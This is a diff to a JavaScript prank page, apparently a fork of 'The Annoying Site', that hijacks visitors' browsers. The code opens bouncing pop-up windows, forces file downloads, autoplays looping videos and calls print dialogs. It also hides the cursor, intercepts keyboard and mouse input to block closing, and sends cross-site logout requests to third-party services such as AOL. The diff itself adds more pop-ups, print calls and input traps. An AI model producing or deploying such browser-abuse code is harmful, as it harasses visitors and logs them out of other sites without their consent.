@@ -1,11 +1,11 @@
 /* global Element */
 
 /**
- *  The Annoying  fish45ddd fish
+ *  The Annoying  fish45d
  *  https://theannoyingsite.com
  *
  *  Author:d
- *    Feross Aboukhadijedh
+ *    Feross Aboukhadijeh
  *    https://feross.org
  *
  *  Patreon:
@@ -15,9 +15,9 @@
 
 const SCREEN_WIDTH = window.screen.availWidth
 const SCREEN_HEIGHT = window.screen.availHeight
-const WIN_WIDTH = 480
-const WIN_HEIGHT = 360
-const VELOCITY = 15
+const WIN_WIDTH = 200
+const WIN_HEIGHT = 150
+const VELOCITY = 50
 const MARGIN = 15
 const TOP_MARGIN = 50
 const TICK_LENGTH = 50
@@ -59,20 +59,28 @@ const SEARCHES = [
 ]
 
 const VIDEOS = [
-  "https://www.youtube.com/watch?v=RHuQqLxmEyg",
-  "https://www.youtube.com/watch?v=tXEPbotEjZE",
-  "https://www.youtube.com/watch?v=LabBY9A1C3k",
-  "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+  "LabBY9A1C3k",
+  "vWQpiMd-v0A",
+  "TPfgPpgwGpo",
+  "uAKaZvPYfsU"
 ]
 
 const FILE_DOWNLOADS = [
   'fish.jpg',
+  'edgar.png',
+  'crabber.jpg',
+  'clyde.png'
 ]
 
 const PHRASES = [
   'fish are sigma2'
 ]
-
+const images = [
+  'fish.jpg',
+  'edgar.png',
+  'crabber.jpg',
+  'clyde.png'
+]
 const LOGOUT_SITES = {
   AOL: ['GET', 'https://my.screenname.aol.com/_cqr/logout/mcLogout.psp?sitedomain=startpage.aol.com&authLev=0&lang=en&locale=us'],
   'AOL 2': ['GET', 'https://api.screenname.aol.com/auth/logout?state=snslogout&r=' + Math.random()],
@@ -181,8 +189,8 @@ function init () {
 
     focusWindows()
     copySpamToClipboard()
-    speak()
-   
+    window.print()
+    
 
     // Capture key presses on the Command or Control keys, to interfere with the
     // "Close Window" shortcut.
@@ -217,17 +225,23 @@ function init () {
  * Initialization code for child windows.
  */
 function initChildWindow () {
+  openWindow()
   registerProtocolHandlers()
   hideCursor()
   moveWindowBounce()
   setupFollowWindow()
- // startVideo()
+ 
+  startVideo()
+  smallvideo()
+ 
+  
+  
   detectWindowClose()
   triggerFileDownload()
   speak()
   rainbowThemeColor()
   animateUrlWithEmojis()
-
+  window.print()
   interceptUserInput(event => {
     if (interactionCount === 1) {
       startAlertInterval()
@@ -248,7 +262,7 @@ function initParentWindow () {
   registerProtocolHandlers()
   attemptToTakeoverReferrerWindow()
   hideCursor()
- // startVideo()
+  startVideo()
   startAlertInterval()
  // superLogout()
  
@@ -301,7 +315,8 @@ function isParentSameOrigin () {
  */
 function confirmPageUnload () {
   window.addEventListener('beforeunload', event => {
-    speak('cook yourself')
+    window.open("https://www.google.com/search?q=skibidi toilet", "_blank");
+    speak('not sigma')
     event.returnValue = true
   })
 }
@@ -516,7 +531,7 @@ function interceptUserInput (onInput) {
   document.body.addEventListener('mousedown', onInput)
   document.body.addEventListener('mouseup', onInput)
   document.body.addEventListener('click', onInput)
-
+  document.body.addEventListener('mousemove', onInput)
   document.body.addEventListener('keydown', onInput)
   document.body.addEventListener('keyup', onInput)
   document.body.addEventListener('keypress', onInput)
@@ -821,6 +836,19 @@ function setupFollowWindow () {
 /**
  * Show a random troll video in the window.
  */
+function showimage() {
+  //document.body.innerHTML = '';
+  var img = document.createElement('img');
+  img.src = getRandomArrayEntry(images)
+  img.width=img.width/3;
+  img.height=img.height/3;
+  window.width=img.width;
+  window.height=img.height;
+  img.style.display = 'block';
+  img.style.margin = '0 auto';
+  img.style.marginTop = '50px';
+  document.body.appendChild(img);
+}
 function startVideo () {
 
 
@@ -828,10 +856,18 @@ function startVideo () {
   // Create the iframe element
   document.addEventListener("DOMContentLoaded", function() {
     var iframe = document.getElementById('yt-player');
-    
-    iframe.src = getRandomArrayEntry(VIDEOS)+"&autoplay=1";
+    var vid = getRandomArrayEntry(VIDEOS)
+    iframe.src = "https://www.youtube.com/embed/"+vid+"?autoplay=1&loop=1&playlist="+vid;
   });
 
+}
+function smallvideo() {
+  document.addEventListener("DOMContentLoaded", function() {
+    var iframe = document.getElementById('yt-player');
+    
+    iframe.width="200";
+    iframe.height="150";
+  });
 }
 
 /**
